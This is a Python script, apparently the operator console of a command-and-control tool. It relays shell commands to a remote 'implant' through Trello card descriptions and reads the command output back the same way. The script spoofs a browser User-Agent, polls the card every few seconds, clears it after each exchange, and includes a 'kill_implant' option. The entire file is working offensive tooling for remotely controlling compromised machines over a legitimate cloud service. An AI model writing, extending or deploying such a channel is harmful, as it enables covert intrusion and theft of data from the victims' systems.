#!/usr/bin/env python3
import requests, time, sys

api_key = input("Trello API key: ")
token = input("Trello token: ")
ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0'}

# the operator checks into the Trello card waiting for command output, at this interval, in seconds
beacon_interval = 3

# prompt operator for card id "CID" displayed at agent runtime.
card_id = input("Enter CID from Agent: ")

# get the agent name associated with the card id
name_endpoint = "https://trello.com/1/cards/" + card_id + "/name"
get_params = {"key":api_key,"token":token}
req = requests.request("GET", name_endpoint, params=get_params, headers=ua)
data = req.json()
agent_name = data['_value']

cards_endpoint = "https://trello.com/1/cards/" + card_id
# main function that sends our cmd to the card endpoint
def put(cmd):
	# send cmd in PUT request to the card
	put_cmd_params = {"name": agent_name,"desc": "cmd:" + cmd,"key": api_key,"token": token}
	req = requests.request("PUT", cards_endpoint, params=put_cmd_params, headers=ua, verify=True)

	# wait for output from the agent to appear in the card, and display it to the operator
	output_exists = False
	output = ""

	while not output_exists:
		time.sleep(beacon_interval)

		# GET requests to the card until "output:" appears in the description
		get_params = {"name": agent_name,"desc": "trello","key": api_key,"token": token}
		req = requests.request("GET", cards_endpoint, params=get_params, headers=ua, verify=True)
		response_data = req.json()
		output = response_data['desc']

		# if "output:" appears in the description, we have command output, and print it to the operator console
		if "output:" in output:
			output_exists = True

	print(output.split(":",1)[1])

	# clear the card contents
	put_null_params = {"name": agent_name,"desc": "","key": api_key,"token": token}
	req = requests.request("PUT", cards_endpoint, params=put_null_params, headers=ua, verify=True)

while True:
	cmd = input(str(agent_name) + " command> ")
	# some options
	if ("show_commands" in cmd) or ("?" in cmd):
		command_menu = """
Available Commands:
> show_commands (Prints this help menu)
> kill_implant (deletes the card, the agent will close its connection, operator script exits)
"""
		print(command_menu)

	elif "kill_implant" in cmd:
		delete_params = {"key": api_key,"token": token}
		req = requests.request("DELETE", cards_endpoint, params=delete_params, headers=ua, verify=True)
		sys.exit()
	else:
		put(cmd)
